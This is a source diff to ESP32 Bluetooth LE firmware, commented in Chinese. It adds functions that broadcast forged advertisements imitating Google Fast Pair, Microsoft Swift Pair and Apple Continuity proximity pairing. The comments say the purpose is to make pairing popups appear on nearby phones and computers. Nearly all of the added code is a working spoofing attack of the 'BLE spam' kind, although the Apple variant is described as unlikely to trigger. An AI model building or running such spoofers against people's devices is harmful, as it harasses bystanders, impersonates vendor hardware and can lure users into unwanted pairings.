@@ -15,6 +15,7 @@
 #include "freertos/task.h"
 #include "freertos/semphr.h"
 #include "esp_log.h"
+#include "esp_mac.h"
 
 #include "host/ble_hs.h"
 #include "host/ble_gap.h"
@@ -418,6 +419,182 @@ int bleadv_eddystone(const char *url, int sec)
     return 0;
 }
 
+/* 弹窗模板: 三类都复用 forged_adv_begin + forged_adv_start_nonconn + start_timeout_task,
+ * 只是载荷不同. 帧结构按各自厂商的公开规范构造; 是否真弹取决于目标设备的
+ * 系统与反滥用机制, 见各函数注释. */
+
+int bleadv_fastpair(uint32_t model_id, int sec)
+{
+    if (s_active) bleadv_stop();
+
+    int rc = forged_adv_begin();
+    if (rc != 0) {
+        printf("META,BLE,ADV,ERR,msg,suspend nus failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    /* Fast Pair: Service Data (0x16), UUID 0xFE2C.
+     * svc_data_uuid16 布局 = [uuid LE 2B][flags 1B][model id 3B].
+     * flags 高 4 位 = 版本(0), 低 4 位 = model id 字节数(3) -> 0x03. */
+    uint8_t svc_data[2 + 1 + 3];
+    svc_data[0] = 0x2C;
+    svc_data[1] = 0xFE;
+    svc_data[2] = 0x03;
+    svc_data[3] = (uint8_t)((model_id >> 16) & 0xFF);
+    svc_data[4] = (uint8_t)((model_id >> 8) & 0xFF);
+    svc_data[5] = (uint8_t)(model_id & 0xFF);
+
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+    fields.svc_data_uuid16 = svc_data;
+    fields.svc_data_uuid16_len = sizeof(svc_data);
+    rc = ble_gap_adv_set_fields(&fields);
+    if (rc != 0) {
+        ble_cli_adv_resume();
+        printf("META,BLE,ADV,ERR,msg,set fields failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    rc = forged_adv_start_nonconn();
+    if (rc != 0) {
+        ble_cli_adv_resume();
+        printf("META,BLE,ADV,ERR,msg,adv start failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    s_active = true;
+    s_type   = BLEADV_FASTPAIR;
+    start_timeout_task(sec);
+
+    printf("META,BLE,ADV,START,type,fastpair,dur,%d,model,0x%06x\n",
+           sec, (unsigned)model_id);
+    fflush(stdout);
+    ESP_LOGI(TAG, "FastPair started: model=0x%06x sec=%d", (unsigned)model_id, sec);
+    return 0;
+}
+
+int bleadv_swiftpair(int sec)
+{
+    if (s_active) bleadv_stop();
+
+    int rc = forged_adv_begin();
+    if (rc != 0) {
+        printf("META,BLE,ADV,ERR,msg,suspend nus failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    /* SwiftPair: Manufacturer Specific Data (0xFF), Company ID 0x0006 (微软).
+     * 结构 = [06 00][0x03 SwiftPair][0x06 len][6B 自定义载荷].
+     * 载荷用板子随机 MAC 的后 6 字节占位; Windows 扫到会弹"附近有设备". */
+    uint8_t mfg[2 + 1 + 1 + 6];
+    mfg[0] = 0x06;
+    mfg[1] = 0x00;
+    mfg[2] = 0x03;
+    mfg[3] = 0x06;
+    uint8_t mac[6] = {0};
+    esp_read_mac(mac, ESP_MAC_BT);
+    memcpy(mfg + 4, mac, 6);
+
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+    fields.mfg_data = mfg;
+    fields.mfg_data_len = sizeof(mfg);
+    rc = ble_gap_adv_set_fields(&fields);
+    if (rc != 0) {
+        ble_cli_adv_resume();
+        printf("META,BLE,ADV,ERR,msg,set fields failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    rc = forged_adv_start_nonconn();
+    if (rc != 0) {
+        ble_cli_adv_resume();
+        printf("META,BLE,ADV,ERR,msg,adv start failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    s_active = true;
+    s_type   = BLEADV_SWIFTPAIR;
+    start_timeout_task(sec);
+
+    printf("META,BLE,ADV,START,type,swiftpair,dur,%d\n", sec);
+    fflush(stdout);
+    ESP_LOGI(TAG, "SwiftPair started: sec=%d", sec);
+    return 0;
+}
+
+int bleadv_continuity(int sec)
+{
+    if (s_active) bleadv_stop();
+
+    int rc = forged_adv_begin();
+    if (rc != 0) {
+        printf("META,BLE,ADV,ERR,msg,suspend nus failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    /* Apple Continuity 邻近配对: Manufacturer Specific Data (0xFF),
+     * Company ID 0x004C (Apple), type 0x07, len 0x13, 19 字节载荷.
+     * 载荷布局按公开逆向: [proximity uuid 4B][major 2B][minor 2B]
+     * [measured power 1B][填充 10B]. 真实弹窗需加密的 offline-finding
+     * 数据与旋转 key, iOS 校验不过会静默丢弃, 所以这个模板只是结构正确,
+     * 弹窗概率最低. */
+    uint8_t mfg[2 + 1 + 1 + 19];
+    mfg[0] = 0x4C;
+    mfg[1] = 0x00;
+    mfg[2] = 0x07;   /* proximity pairing */
+    mfg[3] = 0x13;   /* 19 字节 */
+    mfg[4] = 0x11;   /* proximity uuid (演示值) */
+    mfg[5] = 0x22;
+    mfg[6] = 0x33;
+    mfg[7] = 0x44;
+    mfg[8] = 0x00;   /* major 大端 */
+    mfg[9] = 0x01;
+    mfg[10] = 0x00;  /* minor 大端 */
+    mfg[11] = 0x02;
+    mfg[12] = 0xC5;  /* measured power -59 dBm */
+    for (int i = 13; i < 23; i++) mfg[i] = 0;
+
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+    fields.mfg_data = mfg;
+    fields.mfg_data_len = sizeof(mfg);
+    rc = ble_gap_adv_set_fields(&fields);
+    if (rc != 0) {
+        ble_cli_adv_resume();
+        printf("META,BLE,ADV,ERR,msg,set fields failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    rc = forged_adv_start_nonconn();
+    if (rc != 0) {
+        ble_cli_adv_resume();
+        printf("META,BLE,ADV,ERR,msg,adv start failed\n");
+        fflush(stdout);
+        return rc;
+    }
+
+    s_active = true;
+    s_type   = BLEADV_CONTINUITY;
+    start_timeout_task(sec);
+
+    printf("META,BLE,ADV,START,type,continuity,dur,%d\n", sec);
+    fflush(stdout);
+    ESP_LOGI(TAG, "Continuity started: sec=%d", sec);
+    return 0;
+}
+
 
 int bleadv_stop(void)
 {
@@ -452,8 +629,11 @@ int bleadv_stop(void)
 void bleadv_status(void)
 {
     const char *typestr = "none";
-    if (s_type == BLEADV_IBEACON)   typestr = "ibeacon";
+    if (s_type == BLEADV_IBEACON)      typestr = "ibeacon";
     else if (s_type == BLEADV_EDDYSTONE) typestr = "eddystone";
+    else if (s_type == BLEADV_FASTPAIR)  typestr = "fastpair";
+    else if (s_type == BLEADV_SWIFTPAIR) typestr = "swiftpair";
+    else if (s_type == BLEADV_CONTINUITY) typestr = "continuity";
 
     printf("META,BLE,ADV,STATUS,active,%d,type,%s,remain,%d\n",
            s_active ? 1 : 0, typestr, s_remain);
